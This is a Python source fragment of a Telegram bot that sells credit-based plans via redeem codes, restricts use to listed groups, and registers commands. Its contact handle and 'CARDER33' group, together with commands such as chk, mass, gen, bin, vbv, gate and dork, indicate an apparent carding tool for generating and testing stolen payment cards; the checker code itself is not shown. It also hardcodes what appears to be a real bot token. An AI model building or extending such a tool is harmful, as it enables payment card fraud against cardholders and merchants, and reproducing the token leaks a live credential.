    user_data = await get_user(user_id)
    if user_data.get('plan') != 'Free':
        return await update.effective_message.reply_text(
            "❌ You already have an active plan\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Apply the plan and remove the used code
    plan_name = plan_details['plan_name']
    credits = plan_details['credits']
    duration_days = plan_details['duration_days']
    await _update_user_plan(user_id, plan_name, credits, duration_days)
    del REDEEM_CODES[code]

    response_text = (
        f"🎉 Congratulations\\! Your `{escape_markdown_v2(plan_name)}` has been activated\\.\n"
        f"You have been granted `{credits}` credits and your plan will be active for `{duration_days}` days\\.\n"
        f"Your private access is now active\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)


async def handle_unauthorized_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles commands that are not explicitly authorized for the user/chat."""
    # This handler is a fallback and can be used for logging or a generic message.
    pass

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a user-friendly message if possible."""
    logger.error("Exception while handling an update:", exc_info=context.error)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("❌ An unexpected error occurred\\. Please try again later or contact the owner\\.", parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Failed to send error message to user: {e}")

# 🛑 Users banned from using the bot
BANNED_USERS = set()


# === REGISTERING COMMANDS AND HANDLERS ===
import os
import logging
import re
from functools import wraps
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from db import init_db
from force_join import force_join, check_joined_callback  # import decorator & callback

# 🛡️ Security
AUTHORIZED_CHATS = set([-1002554243871, -1002832894194, -1002996641591, -1002750403340, -1003007390596, -1003040961439, -1002905834316, -1002660201006, -1002397483185, -1001988765966, -1003044358879])  # Only these groups
OWNER_ID =  6701573974                    # Your Telegram user ID

# 🛑 Banned users
BANNED_USERS = set()

# 🔑 Bot token
BOT_TOKEN = "8138635592:AAHoDiNZ7T3uW_av13nEwtXVhRmCqenixm4"

# ✅ Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 🚫 Unauthorized handler
async def block_unauthorized(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚫 This group is not authorized to use this bot.\n\n"
        "📩 Contact @Kalinuxxx to get access.\n"
        "🔗 Official group: https://t.me/CARDER33"
    )

# ✅ Restricted decorator (allow private chats + owner + check banned)
def restricted(func):
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        chat_id = update.effective_chat.id
        chat_type = update.effective_chat.type
        user_id = update.effective_user.id

        # Check banned users
        if user_id in BANNED_USERS:
            await update.message.reply_text("🚫 You are banned from using this bot.")
            return

        # Allow owner, private chats, or authorized groups
        if chat_type != "private" and chat_id not in AUTHORIZED_CHATS and user_id != OWNER_ID:
            await update.message.reply_text(
                "🚫 This group is not authorized to use this bot.\n\n"
                "📩 Contact @Kalinuxxx to get access.\n"
                "🔗 Official group: https://t.me/CARDER33"
            )
            return

        return await func(update, context, *args, **kwargs)
    return wrapped

# 🧠 Database init
async def post_init(application):
    await init_db()
    logger.info("✅ Database initialized")

# 📌 Ban / Unban commands
async def rban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ban a user from using the bot (owner only)."""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only the bot owner can ban users.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /rban <user_id>")
        return

    try:
        user_id = int(context.args[0])
        BANNED_USERS.add(user_id)
        await update.message.reply_text(f"✅ User {user_id} has been banned from using the bot.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please provide a valid number.")

async def fban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Unban a user (owner only)."""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only the bot owner can unban users.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /fban <user_id>")
        return

    try:
        user_id = int(context.args[0])
        BANNED_USERS.discard(user_id)
        await update.message.reply_text(f"✅ User {user_id} has been unbanned and can use the bot again.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID. Please provide a valid number.")

# --- Helper to wrap message handlers so context.args is filled ---
# --- Helper to wrap message handlers so context.args is filled ---
def _make_message_wrapper(handler):
    """
    Return an async wrapper that:
    - parses the message text and sets context.args (like CommandHandler does)
    - then calls the provided handler (which might be restricted(force_join(func)) or plain func)
    """
    @wraps(handler)
    async def _inner(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        text = ""
        if update.effective_message and update.effective_message.text:
            text = update.effective_message.text.strip()
        elif update.effective_message and update.effective_message.caption:
            text = update.effective_message.caption.strip()
        else:
            text = ""

        tokens = text.split()
        context.args = tokens[1:] if len(tokens) > 1 else []

        return await handler(update, context, *args, **kwargs)

    return _inner


# 📌 Helper: Add commands with / and . (supports owner-only and restricted wrapping)
def add_dual_command(application, cmd_name, cmd_func, restricted_wrap=True, owner_only=False):
    pattern = rf"^[./]{re.escape(cmd_name)}(?:\s|$)"
    if restricted_wrap:
        base_handler = restricted(force_join(cmd_func))
    else:
        base_handler = cmd_func
    wrapped_handler = _make_message_wrapper(base_handler)

    msg_filter = filters.Regex(pattern)
    if owner_only:
        msg_filter = msg_filter & filters.User(OWNER_ID)

    application.add_handler(MessageHandler(msg_filter, wrapped_handler))


# ------------------ COMMAND REGISTRATION ------------------
def register_user_commands(application):
    from telegram.ext import CommandHandler

    # /start → must be registered as a CommandHandler
    application.add_handler(CommandHandler("start", start))

    # Normal user commands
    user_commands = [
        ("close", close_command),
        ("restart", restart_command),
        ("info", info),
        ("cmds", cmds_command),
        ("credits", credits_command),
        ("chk", chk_command),
        ("st", st_command),
        ("st1", st1_command),
        ("mass", mass_handler),
        ("sh", sh_command),
        ("hc", hc_command),
        ("at", at_command),
        ("seturl", seturl),
        ("mysites", mysites),
        ("py", py_command),
        ("msp", msp),
        ("removeall", removeall),
        ("rsite", rsite),
        ("adurls", adurls),
        ("sp", sp),
        ("oc", oc_command),
        ("site", site),
        ("msite", msite_command),
        ("gen", gen),
        ("open", open_command),
        ("dork", dork),
        ("adserp", adserp), 
        ("rserp", rserp),
        ("adcr", adcr_command),
        ("ad", ad_command),
        ("bin", bin_lookup),
        ("fk", fk_command),
        ("vbv", vbv),
        ("pp", pp_command),
        ("b3", b3),
        ("gate", gate_command),
        ("fl", fl_command),
        ("status", status_command),
        ("redeem", redeem_command)
    ]

    for name, func in user_commands:
        add_dual_command(application, name, func, restricted_wrap=True, owner_only=False)


def register_owner_commands(application):
    owner_commands = [
        ("admin", admin_command),
        ("changeshsite", changeshsite_command),
        ("give_starter", give_starter),
        ("give_premium", give_premium),
        ("give_plus", give_plus),
        ("give_custom", give_custom),
        ("take_plan", take_plan),
        ("au", auth_group),
        ("reset", reset_command),
        ("rauth", remove_authorize_user),
        ("gen_codes", gen_codes_command),
        ("rban", rban),
        ("fban", fban),
    ]

    for name, func in owner_commands:
        add_dual_command(application, name, func, restricted_wrap=False, owner_only=True)


# ------------------ MAIN ------------------
def main():
    application = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    # Register commands
    register_user_commands(application)
    register_owner_commands(application)

    # Callback handlers
    application.add_handler(CallbackQueryHandler(cmds_pagination, pattern="^page_"))
    application.add_handler(CallbackQueryHandler(handle_close, pattern="^close$"))
    application.add_handler(CallbackQueryHandler(button_handler, pattern="^stop:"))
    application.add_handler(CallbackQueryHandler(dork_pagination, pattern=r"^dork_"))
    application.add_handler(CallbackQueryHandler(check_joined_callback, pattern="^check_joined$"))

    # Generic handler for all /start menu buttons
    application.add_handler(CallbackQueryHandler(handle_callback))

    # Error handler
    application.add_error_handler(error_handler)

    logger.info("🤖 Bot started and is polling for updates...")
    application.run_polling()


if __name__ == "__main__":
    main()

